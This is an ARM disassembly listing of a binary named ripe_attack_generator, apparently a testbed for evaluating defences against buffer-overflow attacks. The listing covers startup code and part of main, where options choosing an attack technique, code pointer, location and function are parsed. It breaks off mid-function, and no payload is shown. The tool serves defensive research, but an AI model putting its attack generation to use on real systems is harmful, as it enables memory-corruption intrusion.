
ripe_attack_generator:     file format elf32-littlearm


Disassembly of section .init:

00008894 <_init>:
    8894:	e92d4008 	push	{r3, lr}
    8898:	eb000080 	bl	8aa0 <call_weak_fn>
    889c:	e8bd8008 	pop	{r3, pc}

Disassembly of section .plt:

000088a0 <.plt>:
    88a0:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
    88a4:	e59fe004 	ldr	lr, [pc, #4]	; 88b0 <_init+0x1c>
    88a8:	e08fe00e 	add	lr, pc, lr
    88ac:	e5bef008 	ldr	pc, [lr, #8]!
    88b0:	0000d750 	.word	0x0000d750
    88b4:	e28fc600 	add	ip, pc, #0
    88b8:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    88bc:	e5bcf750 	ldr	pc, [ip, #1872]!	; 0x750
    88c0:	e28fc600 	add	ip, pc, #0
    88c4:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    88c8:	e5bcf748 	ldr	pc, [ip, #1864]!	; 0x748
    88cc:	e28fc600 	add	ip, pc, #0
    88d0:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    88d4:	e5bcf740 	ldr	pc, [ip, #1856]!	; 0x740
    88d8:	e28fc600 	add	ip, pc, #0
    88dc:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    88e0:	e5bcf738 	ldr	pc, [ip, #1848]!	; 0x738
    88e4:	e28fc600 	add	ip, pc, #0
    88e8:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    88ec:	e5bcf730 	ldr	pc, [ip, #1840]!	; 0x730
    88f0:	e28fc600 	add	ip, pc, #0
    88f4:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    88f8:	e5bcf728 	ldr	pc, [ip, #1832]!	; 0x728
    88fc:	e28fc600 	add	ip, pc, #0
    8900:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    8904:	e5bcf720 	ldr	pc, [ip, #1824]!	; 0x720
    8908:	e28fc600 	add	ip, pc, #0
    890c:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    8910:	e5bcf718 	ldr	pc, [ip, #1816]!	; 0x718
    8914:	e28fc600 	add	ip, pc, #0
    8918:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    891c:	e5bcf710 	ldr	pc, [ip, #1808]!	; 0x710
    8920:	e28fc600 	add	ip, pc, #0
    8924:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    8928:	e5bcf708 	ldr	pc, [ip, #1800]!	; 0x708
    892c:	e28fc600 	add	ip, pc, #0
    8930:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    8934:	e5bcf700 	ldr	pc, [ip, #1792]!	; 0x700
    8938:	e28fc600 	add	ip, pc, #0
    893c:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    8940:	e5bcf6f8 	ldr	pc, [ip, #1784]!	; 0x6f8
    8944:	e28fc600 	add	ip, pc, #0
    8948:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    894c:	e5bcf6f0 	ldr	pc, [ip, #1776]!	; 0x6f0
    8950:	e28fc600 	add	ip, pc, #0
    8954:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    8958:	e5bcf6e8 	ldr	pc, [ip, #1768]!	; 0x6e8
    895c:	e28fc600 	add	ip, pc, #0
    8960:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    8964:	e5bcf6e0 	ldr	pc, [ip, #1760]!	; 0x6e0
    8968:	e28fc600 	add	ip, pc, #0
    896c:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    8970:	e5bcf6d8 	ldr	pc, [ip, #1752]!	; 0x6d8
    8974:	e28fc600 	add	ip, pc, #0
    8978:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    897c:	e5bcf6d0 	ldr	pc, [ip, #1744]!	; 0x6d0
    8980:	e28fc600 	add	ip, pc, #0
    8984:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    8988:	e5bcf6c8 	ldr	pc, [ip, #1736]!	; 0x6c8
    898c:	e28fc600 	add	ip, pc, #0
    8990:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    8994:	e5bcf6c0 	ldr	pc, [ip, #1728]!	; 0x6c0
    8998:	e28fc600 	add	ip, pc, #0
    899c:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    89a0:	e5bcf6b8 	ldr	pc, [ip, #1720]!	; 0x6b8
    89a4:	e28fc600 	add	ip, pc, #0
    89a8:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    89ac:	e5bcf6b0 	ldr	pc, [ip, #1712]!	; 0x6b0
    89b0:	e28fc600 	add	ip, pc, #0
    89b4:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    89b8:	e5bcf6a8 	ldr	pc, [ip, #1704]!	; 0x6a8
    89bc:	e28fc600 	add	ip, pc, #0
    89c0:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    89c4:	e5bcf6a0 	ldr	pc, [ip, #1696]!	; 0x6a0
    89c8:	e28fc600 	add	ip, pc, #0
    89cc:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    89d0:	e5bcf698 	ldr	pc, [ip, #1688]!	; 0x698
    89d4:	e28fc600 	add	ip, pc, #0
    89d8:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    89dc:	e5bcf690 	ldr	pc, [ip, #1680]!	; 0x690
    89e0:	e28fc600 	add	ip, pc, #0
    89e4:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    89e8:	e5bcf688 	ldr	pc, [ip, #1672]!	; 0x688
    89ec:	e28fc600 	add	ip, pc, #0
    89f0:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    89f4:	e5bcf680 	ldr	pc, [ip, #1664]!	; 0x680
    89f8:	e28fc600 	add	ip, pc, #0
    89fc:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    8a00:	e5bcf678 	ldr	pc, [ip, #1656]!	; 0x678
    8a04:	e28fc600 	add	ip, pc, #0
    8a08:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    8a0c:	e5bcf670 	ldr	pc, [ip, #1648]!	; 0x670
    8a10:	e28fc600 	add	ip, pc, #0
    8a14:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    8a18:	e5bcf668 	ldr	pc, [ip, #1640]!	; 0x668
    8a1c:	e28fc600 	add	ip, pc, #0
    8a20:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    8a24:	e5bcf660 	ldr	pc, [ip, #1632]!	; 0x660
    8a28:	e28fc600 	add	ip, pc, #0
    8a2c:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    8a30:	e5bcf658 	ldr	pc, [ip, #1624]!	; 0x658
    8a34:	e28fc600 	add	ip, pc, #0
    8a38:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    8a3c:	e5bcf650 	ldr	pc, [ip, #1616]!	; 0x650
    8a40:	e28fc600 	add	ip, pc, #0
    8a44:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    8a48:	e5bcf648 	ldr	pc, [ip, #1608]!	; 0x648
    8a4c:	e28fc600 	add	ip, pc, #0
    8a50:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    8a54:	e5bcf640 	ldr	pc, [ip, #1600]!	; 0x640
    8a58:	e28fc600 	add	ip, pc, #0
    8a5c:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    8a60:	e5bcf638 	ldr	pc, [ip, #1592]!	; 0x638
    8a64:	e28fc600 	add	ip, pc, #0
    8a68:	e28cca0d 	add	ip, ip, #53248	; 0xd000
    8a6c:	e5bcf630 	ldr	pc, [ip, #1584]!	; 0x630

Disassembly of section .text:

00008a70 <_start>:
    8a70:	f04f 0b00 	mov.w	fp, #0
    8a74:	f04f 0e00 	mov.w	lr, #0
    8a78:	bc02      	pop	{r1}
    8a7a:	466a      	mov	r2, sp
    8a7c:	b404      	push	{r2}
    8a7e:	b401      	push	{r0}
    8a80:	f8df c010 	ldr.w	ip, [pc, #16]	; 8a94 <_start+0x24>
    8a84:	f84d cd04 	str.w	ip, [sp, #-4]!
    8a88:	4803      	ldr	r0, [pc, #12]	; (8a98 <_start+0x28>)
    8a8a:	4b04      	ldr	r3, [pc, #16]	; (8a9c <_start+0x2c>)
    8a8c:	f7ff ef7e 	blx	898c <_init+0xf8>
    8a90:	f7ff efe8 	blx	8a64 <_init+0x1d0>
    8a94:	0000c641 	.word	0x0000c641
    8a98:	00008b9d 	.word	0x00008b9d
    8a9c:	0000c601 	.word	0x0000c601

00008aa0 <call_weak_fn>:
    8aa0:	e59f3014 	ldr	r3, [pc, #20]	; 8abc <call_weak_fn+0x1c>
    8aa4:	e59f2014 	ldr	r2, [pc, #20]	; 8ac0 <call_weak_fn+0x20>
    8aa8:	e08f3003 	add	r3, pc, r3
    8aac:	e7932002 	ldr	r2, [r3, r2]
    8ab0:	e3520000 	cmp	r2, #0
    8ab4:	012fff1e 	bxeq	lr
    8ab8:	eaffffb9 	b	89a4 <_init+0x110>
    8abc:	0000d550 	.word	0x0000d550
    8ac0:	000000a0 	.word	0x000000a0

00008ac4 <deregister_tm_clones>:
    8ac4:	4b07      	ldr	r3, [pc, #28]	; (8ae4 <deregister_tm_clones+0x20>)
    8ac6:	f646 0060 	movw	r0, #26720	; 0x6860
    8aca:	f2c0 0001 	movt	r0, #1
    8ace:	1a1b      	subs	r3, r3, r0
    8ad0:	2b06      	cmp	r3, #6
    8ad2:	d800      	bhi.n	8ad6 <deregister_tm_clones+0x12>
    8ad4:	4770      	bx	lr
    8ad6:	f240 0300 	movw	r3, #0
    8ada:	f2c0 0300 	movt	r3, #0
    8ade:	2b00      	cmp	r3, #0
    8ae0:	d0f8      	beq.n	8ad4 <deregister_tm_clones+0x10>
    8ae2:	4718      	bx	r3
    8ae4:	00016863 	.word	0x00016863

00008ae8 <register_tm_clones>:
    8ae8:	f646 0360 	movw	r3, #26720	; 0x6860
    8aec:	f646 0060 	movw	r0, #26720	; 0x6860
    8af0:	f2c0 0301 	movt	r3, #1
    8af4:	f2c0 0001 	movt	r0, #1
    8af8:	1a1b      	subs	r3, r3, r0
    8afa:	109b      	asrs	r3, r3, #2
    8afc:	eb03 73d3 	add.w	r3, r3, r3, lsr #31
    8b00:	1059      	asrs	r1, r3, #1
    8b02:	d100      	bne.n	8b06 <register_tm_clones+0x1e>
    8b04:	4770      	bx	lr
    8b06:	f240 0200 	movw	r2, #0
    8b0a:	f2c0 0200 	movt	r2, #0
    8b0e:	2a00      	cmp	r2, #0
    8b10:	d0f8      	beq.n	8b04 <register_tm_clones+0x1c>
    8b12:	4710      	bx	r2

00008b14 <__do_global_dtors_aux>:
    8b14:	b510      	push	{r4, lr}
    8b16:	f646 046c 	movw	r4, #26732	; 0x686c
    8b1a:	f2c0 0401 	movt	r4, #1
    8b1e:	7823      	ldrb	r3, [r4, #0]
    8b20:	b91b      	cbnz	r3, 8b2a <__do_global_dtors_aux+0x16>
    8b22:	f7ff ffcf 	bl	8ac4 <deregister_tm_clones>
    8b26:	2301      	movs	r3, #1
    8b28:	7023      	strb	r3, [r4, #0]
    8b2a:	bd10      	pop	{r4, pc}

00008b2c <frame_dummy>:
    8b2c:	f645 7014 	movw	r0, #24340	; 0x5f14
    8b30:	f2c0 0001 	movt	r0, #1
    8b34:	b508      	push	{r3, lr}
    8b36:	6803      	ldr	r3, [r0, #0]
    8b38:	b12b      	cbz	r3, 8b46 <frame_dummy+0x1a>
    8b3a:	f240 0300 	movw	r3, #0
    8b3e:	f2c0 0300 	movt	r3, #0
    8b42:	b103      	cbz	r3, 8b46 <frame_dummy+0x1a>
    8b44:	4798      	blx	r3
    8b46:	e8bd 4008 	ldmia.w	sp!, {r3, lr}
    8b4a:	e7cd      	b.n	8ae8 <register_tm_clones>

00008b4c <dummy_function>:
    8b4c:	b480      	push	{r7}
    8b4e:	b083      	sub	sp, #12
    8b50:	af00      	add	r7, sp, #0
    8b52:	6078      	str	r0, [r7, #4]
    8b54:	2300      	movs	r3, #0
    8b56:	4618      	mov	r0, r3
    8b58:	370c      	adds	r7, #12
    8b5a:	46bd      	mov	sp, r7
    8b5c:	f85d 7b04 	ldr.w	r7, [sp], #4
    8b60:	4770      	bx	lr
    8b62:	bf00      	nop

00008b64 <fooz>:
    8b64:	b580      	push	{r7, lr}
    8b66:	b084      	sub	sp, #16
    8b68:	af00      	add	r7, sp, #0
    8b6a:	6078      	str	r0, [r7, #4]
    8b6c:	6039      	str	r1, [r7, #0]
    8b6e:	687b      	ldr	r3, [r7, #4]
    8b70:	60fb      	str	r3, [r7, #12]
    8b72:	683b      	ldr	r3, [r7, #0]
    8b74:	60bb      	str	r3, [r7, #8]
    8b76:	f646 0360 	movw	r3, #26720	; 0x6860
    8b7a:	f2c0 0301 	movt	r3, #1
    8b7e:	681b      	ldr	r3, [r3, #0]
    8b80:	f64c 0000 	movw	r0, #51200	; 0xc800
    8b84:	f2c0 0000 	movt	r0, #0
    8b88:	2101      	movs	r1, #1
    8b8a:	220f      	movs	r2, #15
    8b8c:	f7ff eeda 	blx	8944 <_init+0xb0>
    8b90:	2301      	movs	r3, #1
    8b92:	4618      	mov	r0, r3
    8b94:	3710      	adds	r7, #16
    8b96:	46bd      	mov	sp, r7
    8b98:	bd80      	pop	{r7, pc}
    8b9a:	bf00      	nop

00008b9c <main>:
    8b9c:	b580      	push	{r7, lr}
    8b9e:	f5ad 3d44 	sub.w	sp, sp, #200704	; 0x31000
    8ba2:	b0e8      	sub	sp, #416	; 0x1a0
    8ba4:	af00      	add	r7, sp, #0
    8ba6:	f507 73d0 	add.w	r3, r7, #416	; 0x1a0
    8baa:	f5a3 73ce 	sub.w	r3, r3, #412	; 0x19c
    8bae:	6018      	str	r0, [r3, #0]
    8bb0:	f507 73d0 	add.w	r3, r7, #416	; 0x1a0
    8bb4:	f5a3 73d0 	sub.w	r3, r3, #416	; 0x1a0
    8bb8:	6019      	str	r1, [r3, #0]
    8bba:	2300      	movs	r3, #0
    8bbc:	f507 3144 	add.w	r1, r7, #200704	; 0x31000
    8bc0:	f501 71ce 	add.w	r1, r1, #412	; 0x19c
    8bc4:	600b      	str	r3, [r1, #0]
    8bc6:	2300      	movs	r3, #0
    8bc8:	f507 3244 	add.w	r2, r7, #200704	; 0x31000
    8bcc:	f502 72ce 	add.w	r2, r2, #412	; 0x19c
    8bd0:	6013      	str	r3, [r2, #0]
    8bd2:	e01f      	b.n	8c14 <main+0x78>
    8bd4:	f507 73d0 	add.w	r3, r7, #416	; 0x1a0
    8bd8:	f5a3 73cc 	sub.w	r3, r3, #408	; 0x198
    8bdc:	f507 3144 	add.w	r1, r7, #200704	; 0x31000
    8be0:	f501 71ce 	add.w	r1, r1, #412	; 0x19c
    8be4:	680a      	ldr	r2, [r1, #0]
    8be6:	f44f 71c4 	mov.w	r1, #392	; 0x188
    8bea:	fb01 f202 	mul.w	r2, r1, r2
    8bee:	4413      	add	r3, r2
    8bf0:	4618      	mov	r0, r3
    8bf2:	f002 ff27 	bl	ba44 <contains_terminating_char>
    8bf6:	4603      	mov	r3, r0
    8bf8:	2b00      	cmp	r3, #0
    8bfa:	d100      	bne.n	8bfe <main+0x62>
    8bfc:	e012      	b.n	8c24 <main+0x88>
    8bfe:	f507 3244 	add.w	r2, r7, #200704	; 0x31000
    8c02:	f502 72ce 	add.w	r2, r2, #412	; 0x19c
    8c06:	6813      	ldr	r3, [r2, #0]
    8c08:	3301      	adds	r3, #1
    8c0a:	f507 3144 	add.w	r1, r7, #200704	; 0x31000
    8c0e:	f501 71ce 	add.w	r1, r1, #412	; 0x19c
    8c12:	600b      	str	r3, [r1, #0]
    8c14:	f507 3244 	add.w	r2, r7, #200704	; 0x31000
    8c18:	f502 72ce 	add.w	r2, r2, #412	; 0x19c
    8c1c:	6813      	ldr	r3, [r2, #0]
    8c1e:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
    8c22:	dbd7      	blt.n	8bd4 <main+0x38>
    8c24:	f507 3144 	add.w	r1, r7, #200704	; 0x31000
    8c28:	f501 71ce 	add.w	r1, r1, #412	; 0x19c
    8c2c:	680b      	ldr	r3, [r1, #0]
    8c2e:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
    8c32:	d10f      	bne.n	8c54 <main+0xb8>
    8c34:	f646 0360 	movw	r3, #26720	; 0x6860
    8c38:	f2c0 0301 	movt	r3, #1
    8c3c:	681b      	ldr	r3, [r3, #0]
    8c3e:	f64c 0010 	movw	r0, #51216	; 0xc810
    8c42:	f2c0 0000 	movt	r0, #0
    8c46:	2101      	movs	r1, #1
    8c48:	2233      	movs	r2, #51	; 0x33
    8c4a:	f7ff ee7c 	blx	8944 <_init+0xb0>
    8c4e:	2001      	movs	r0, #1
    8c50:	f7ff eeae 	blx	89b0 <_init+0x11c>
    8c54:	e12b      	b.n	8eae <main+0x312>
    8c56:	f507 3244 	add.w	r2, r7, #200704	; 0x31000
    8c5a:	f502 72ca 	add.w	r2, r2, #404	; 0x194
    8c5e:	6813      	ldr	r3, [r2, #0]
    8c60:	3b63      	subs	r3, #99	; 0x63
    8c62:	2b11      	cmp	r3, #17
    8c64:	f200 8107 	bhi.w	8e76 <main+0x2da>
    8c68:	a101      	add	r1, pc, #4	; (adr r1, 8c70 <main+0xd4>)
    8c6a:	f851 f023 	ldr.w	pc, [r1, r3, lsl #2]
    8c6e:	bf00      	nop
    8c70:	00008cdd 	.word	0x00008cdd
    8c74:	00008d13 	.word	0x00008d13
    8c78:	00008d8b 	.word	0x00008d8b
    8c7c:	00008d01 	.word	0x00008d01
    8c80:	00008e77 	.word	0x00008e77
    8c84:	00008e77 	.word	0x00008e77
    8c88:	00008ccb 	.word	0x00008ccb
    8c8c:	00008e77 	.word	0x00008e77
    8c90:	00008e77 	.word	0x00008e77
    8c94:	00008cef 	.word	0x00008cef
    8c98:	00008e77 	.word	0x00008e77
    8c9c:	00008e77 	.word	0x00008e77
    8ca0:	00008e03 	.word	0x00008e03
    8ca4:	00008e77 	.word	0x00008e77
    8ca8:	00008e77 	.word	0x00008e77
    8cac:	00008e77 	.word	0x00008e77
    8cb0:	00008e77 	.word	0x00008e77
    8cb4:	00008cb9 	.word	0x00008cb9
    8cb8:	f646 0368 	movw	r3, #26728	; 0x6868
    8cbc:	f2c0 0301 	movt	r3, #1
    8cc0:	681b      	ldr	r3, [r3, #0]
    8cc2:	4618      	mov	r0, r3
    8cc4:	f002 fb52 	bl	b36c <set_technique>
    8cc8:	e0f1      	b.n	8eae <main+0x312>
    8cca:	f646 0368 	movw	r3, #26728	; 0x6868
    8cce:	f2c0 0301 	movt	r3, #1
    8cd2:	681b      	ldr	r3, [r3, #0]
    8cd4:	4618      	mov	r0, r3
    8cd6:	f002 fb83 	bl	b3e0 <set_inject_param>
    8cda:	e0e8      	b.n	8eae <main+0x312>
    8cdc:	f646 0368 	movw	r3, #26728	; 0x6868
    8ce0:	f2c0 0301 	movt	r3, #1
    8ce4:	681b      	ldr	r3, [r3, #0]
    8ce6:	4618      	mov	r0, r3
    8ce8:	f002 fc0a 	bl	b500 <set_code_ptr>
    8cec:	e0df      	b.n	8eae <main+0x312>
    8cee:	f646 0368 	movw	r3, #26728	; 0x6868
    8cf2:	f2c0 0301 	movt	r3, #1
    8cf6:	681b      	ldr	r3, [r3, #0]
    8cf8:	4618      	mov	r0, r3
    8cfa:	f002 fd5f 	bl	b7bc <set_location>
    8cfe:	e0d6      	b.n	8eae <main+0x312>
    8d00:	f646 0368 	movw	r3, #26728	; 0x6868
    8d04:	f2c0 0301 	movt	r3, #1
    8d08:	681b      	ldr	r3, [r3, #0]
    8d0a:	4618      	mov	r0, r3
    8d0c:	f002 fdc4 	bl	b898 <set_function>
    8d10:	e0cd      	b.n	8eae <main+0x312>
    8d12:	f646 0368 	movw	r3, #26728	; 0x6868
    8d16:	f2c0 0301 	movt	r3, #1
    8d1a:	681b      	ldr	r3, [r3, #0]
    8d1c:	f64c 0044 	movw	r0, #51268	; 0xc844
    8d20:	f2c0 0000 	movt	r0, #0
    8d24:	4619      	mov	r1, r3
    8d26:	f7ff edc6 	blx	88b4 <_init+0x20>
    8d2a:	4603      	mov	r3, r0
    8d2c:	2b00      	cmp	r3, #0
    8d2e:	d113      	bne.n	8d58 <main+0x1bc>
    8d30:	f646 2380 	movw	r3, #27264	; 0x6a80
    8d34:	f2c0 0301 	movt	r3, #1
    8d38:	2201      	movs	r2, #1
    8d3a:	601a      	str	r2, [r3, #0]
    8d3c:	f646 0360 	movw	r3, #26720	; 0x6860
    8d40:	f2c0 0301 	movt	r3, #1
    8d44:	681b      	ldr	r3, [r3, #0]
    8d46:	f64c 0048 	movw	r0, #51272	; 0xc848
    8d4a:	f2c0 0000 	movt	r0, #0
    8d4e:	2101      	movs	r1, #1
    8d50:	221d      	movs	r2, #29
    8d52:	f7ff edf8 	blx	8944 <_init+0xb0>
    8d56:	e0aa      	b.n	8eae <main+0x312>
    8d58:	f646 2380 	movw	r3, #27264	; 0x6a80
    8d5c:	f2c0 0301 	movt	r3, #1
    8d60:	2200      	movs	r2, #0
    8d62:	601a      	str	r2, [r3, #0]
    8d64:	f646 0360 	movw	r3, #26720	; 0x6860
    8d68:	f2c0 0301 	movt	r3, #1
    8d6c:	681a      	ldr	r2, [r3, #0]
    8d6e:	f646 0368 	movw	r3, #26728	; 0x6868
    8d72:	f2c0 0301 	movt	r3, #1
    8d76:	681b      	ldr	r3, [r3, #0]
    8d78:	4610      	mov	r0, r2
    8d7a:	f64c 0168 	movw	r1, #51304	; 0xc868
    8d7e:	f2c0 0100 	movt	r1, #0
    8d82:	461a      	mov	r2, r3
    8d84:	f7ff ee26 	blx	89d4 <_init+0x140>
    8d88:	e091      	b.n	8eae <main+0x312>
    8d8a:	f646 0368 	movw	r3, #26728	; 0x6868
    8d8e:	f2c0 0301 	movt	r3, #1
    8d92:	681b      	ldr	r3, [r3, #0]
    8d94:	f64c 0044 	movw	r0, #51268	; 0xc844
    8d98:	f2c0 0000 	movt	r0, #0
    8d9c:	4619      	mov	r1, r3
    8d9e:	f7ff ed8a 	blx	88b4 <_init+0x20>
    8da2:	4603      	mov	r3, r0
    8da4:	2b00      	cmp	r3, #0
    8da6:	d113      	bne.n	8dd0 <main+0x234>
    8da8:	f646 0350 	movw	r3, #26704	; 0x6850
    8dac:	f2c0 0301 	movt	r3, #1
    8db0:	2201      	movs	r2, #1
    8db2:	601a      	str	r2, [r3, #0]
    8db4:	f646 0360 	movw	r3, #26720	; 0x6860
    8db8:	f2c0 0301 	movt	r3, #1
    8dbc:	681b      	ldr	r3, [r3, #0]
    8dbe:	f64c 00a0 	movw	r0, #51360	; 0xc8a0
    8dc2:	f2c0 0000 	movt	r0, #0
    8dc6:	2101      	movs	r1, #1
    8dc8:	221c      	movs	r2, #28
    8dca:	f7ff edbc 	blx	8944 <_init+0xb0>
    8dce:	e06e      	b.n	8eae <main+0x312>
    8dd0:	f646 0350 	movw	r3, #26704	; 0x6850
    8dd4:	f2c0 0301 	movt	r3, #1
    8dd8:	2200      	movs	r2, #0
    8dda:	601a      	str	r2, [r3, #0]
    8ddc:	f646 0360 	movw	r3, #26720	; 0x6860
    8de0:	f2c0 0301 	movt	r3, #1
    8de4:	681a      	ldr	r2, [r3, #0]
    8de6:	f646 0368 	movw	r3, #26728	; 0x6868
    8dea:	f2c0 0301 	movt	r3, #1
    8dee:	681b      	ldr	r3, [r3, #0]
    8df0:	4610      	mov	r0, r2
    8df2:	f64c 01c0 	movw	r1, #51392	; 0xc8c0
    8df6:	f2c0 0100 	movt	r1, #0
    8dfa:	461a      	mov	r2, r3
    8dfc:	f7ff edea 	blx	89d4 <_init+0x140>
    8e00:	e055      	b.n	8eae <main+0x312>
    8e02:	f646 0368 	movw	r3, #26728	; 0x6868
    8e06:	f2c0 0301 	movt	r3, #1
    8e0a:	681b      	ldr	r3, [r3, #0]
    8e0c:	4618      	mov	r0, r3
    8e0e:	f64c 01f4 	movw	r1, #51444	; 0xc8f4
    8e12:	f2c0 0100 	movt	r1, #0
    8e16:	f7ff ed60 	blx	88d8 <_init+0x44>
    8e1a:	f507 3244 	add.w	r2, r7, #200704	; 0x31000
    8e1e:	f502 72cc 	add.w	r2, r2, #408	; 0x198
    8e22:	6010      	str	r0, [r2, #0]
    8e24:	f507 3144 	add.w	r1, r7, #200704	; 0x31000
    8e28:	f501 71cc 	add.w	r1, r1, #408	; 0x198
    8e2c:	680b      	ldr	r3, [r1, #0]
    8e2e:	2b00      	cmp	r3, #0
    8e30:	d119      	bne.n	8e66 <main+0x2ca>
    8e32:	f646 0350 	movw	r3, #26704	; 0x6850
    8e36:	f2c0 0301 	movt	r3, #1
    8e3a:	681b      	ldr	r3, [r3, #0]
    8e3c:	2b00      	cmp	r3, #0
    8e3e:	d019      	beq.n	8e74 <main+0x2d8>
    8e40:	f646 0360 	movw	r3, #26720	; 0x6860
    8e44:	f2c0 0301 	movt	r3, #1
    8e48:	681a      	ldr	r2, [r3, #0]
    8e4a:	f646 0368 	movw	r3, #26728	; 0x6868
    8e4e:	f2c0 0301 	movt	r3, #1
    8e52:	681b      	ldr	r3, [r3, #0]
    8e54:	4610      	mov	r0, r2
    8e56:	f64c 01f8 	movw	r1, #51448	; 0xc8f8
    8e5a:	f2c0 0100 	movt	r1, #0
    8e5e:	461a      	mov	r2, r3
    8e60:	f7ff edb8 	blx	89d4 <_init+0x140>
    8e64:	e023      	b.n	8eae <main+0x312>
    8e66:	f646 2384 	movw	r3, #27268	; 0x6a84
    8e6a:	f2c0 0301 	movt	r3, #1
    8e6e:	2201      	movs	r2, #1
    8e70:	601a      	str	r2, [r3, #0]
    8e72:	e01c      	b.n	8eae <main+0x312>
    8e74:	e01b      	b.n	8eae <main+0x312>
    8e76:	f646 0350 	movw	r3, #26704	; 0x6850
    8e7a:	f2c0 0301 	movt	r3, #1
    8e7e:	681b      	ldr	r3, [r3, #0]
    8e80:	2b00      	cmp	r3, #0
    8e82:	d011      	beq.n	8ea8 <main+0x30c>
    8e84:	f646 0360 	movw	r3, #26720	; 0x6860
    8e88:	f2c0 0301 	movt	r3, #1
    8e8c:	681a      	ldr	r2, [r3, #0]
    8e8e:	f646 0368 	movw	r3, #26728	; 0x6868
    8e92:	f2c0 0301 	movt	r3, #1
    8e96:	681b      	ldr	r3, [r3, #0]
    8e98:	4610      	mov	r0, r2
    8e9a:	f64c 111c 	movw	r1, #51484	; 0xc91c
    8e9e:	f2c0 0100 	movt	r1, #0
    8ea2:	461a      	mov	r2, r3
    8ea4:	f7ff ed96 	blx	89d4 <_init+0x140>
    8ea8:	2001      	movs	r0, #1
    8eaa:	f7ff ed82 	blx	89b0 <_init+0x11c>
    8eae:	f507 72d0 	add.w	r2, r7, #416	; 0x1a0
    8eb2:	f5a2 72ce 	sub.w	r2, r2, #412	; 0x19c
    8eb6:	f507 73d0 	add.w	r3, r7, #416	; 0x1a0
    8eba:	f5a3 73d0 	sub.w	r3, r3, #416	; 0x1a0
    8ebe:	6810      	ldr	r0, [r2, #0]
    8ec0:	6819      	ldr	r1, [r3, #0]
    8ec2:	f64c 1240 	movw	r2, #51520	; 0xc940
    8ec6:	f2c0 0200 	movt	r2, #0
    8eca:	f7ff ed7e 	blx	89c8 <_init+0x134>
    8ece:	f507 3244 	add.w	r2, r7, #200704	; 0x31000
    8ed2:	f502 72ca 	add.w	r2, r2, #404	; 0x194
    8ed6:	6010      	str	r0, [r2, #0]
    8ed8:	f507 3144 	add.w	r1, r7, #200704	; 0x31000
    8edc:	f501 71ca 	add.w	r1, r1, #404	; 0x194
    8ee0:	680b      	ldr	r3, [r1, #0]
    8ee2:	f1b3 3fff 	cmp.w	r3, #4294967295
    8ee6:	f47f aeb6 	bne.w	8c56 <main+0xba>
    8eea:	f646 2384 	movw	r3, #27268	; 0x6a84
    8eee:	f2c0 0301 	movt	r3, #1
    8ef2:	681b      	ldr	r3, [r3, #0]
    8ef4:	2b00      	cmp	r3, #0
    8ef6:	d137      	bne.n	8f68 <main+0x3cc>
    8ef8:	f646 2380 	movw	r3, #27264	; 0x6a80
    8efc:	f2c0 0301 	movt	r3, #1
    8f00:	681b      	ldr	r3, [r3, #0]
    8f02:	2b00      	cmp	r3, #0
    8f04:	d030      	beq.n	8f68 <main+0x3cc>
    8f06:	f64c 1050 	movw	r0, #51536	; 0xc950
    8f0a:	f2c0 0000 	movt	r0, #0
    8f0e:	f64c 01f4 	movw	r1, #51444	; 0xc8f4
    8f12:	f2c0 0100 	movt	r1, #0
    8f16:	f7ff ece0 	blx	88d8 <_init+0x44>
    8f1a:	f507 3244 	add.w	r2, r7, #200704	; 0x31000
    8f1e:	f502 72cc 	add.w	r2, r2, #408	; 0x198
    8f22:	6010      	str	r0, [r2, #0]
    8f24:	f507 3144 	add.w	r1, r7, #200704	; 0x31000
    8f28:	f501 71cc 	add.w	r1, r1, #408	; 0x198
    8f2c:	680b      	ldr	r3, [r1, #0]
    8f2e:	2b00      	cmp	r3, #0
    8f30:	d114      	bne.n	8f5c <main+0x3c0>
    8f32:	f646 0350 	movw	r3, #26704	; 0x6850
    8f36:	f2c0 0301 	movt	r3, #1
    8f3a:	681b      	ldr	r3, [r3, #0]
    8f3c:	2b00      	cmp	r3, #0
    8f3e:	d013      	beq.n	8f68 <main+0x3cc>
    8f40:	f646 0360 	movw	r3, #26720	; 0x6860
    8f44:	f2c0 0301 	movt	r3, #1
    8f48:	681b      	ldr	r3, [r3, #0]
    8f4a:	f64c 106c 	movw	r0, #51564	; 0xc96c
    8f4e:	f2c0 0000 	movt	r0, #0
    8f52:	2101      	movs	r1, #1
    8f54:	2227      	movs	r2, #39	; 0x27
    8f56:	f7ff ecf6 	blx	8944 <_init+0xb0>
    8f5a:	e005      	b.n	8f68 <main+0x3cc>
    8f5c:	f646 2384 	movw	r3, #27268	; 0x6a84
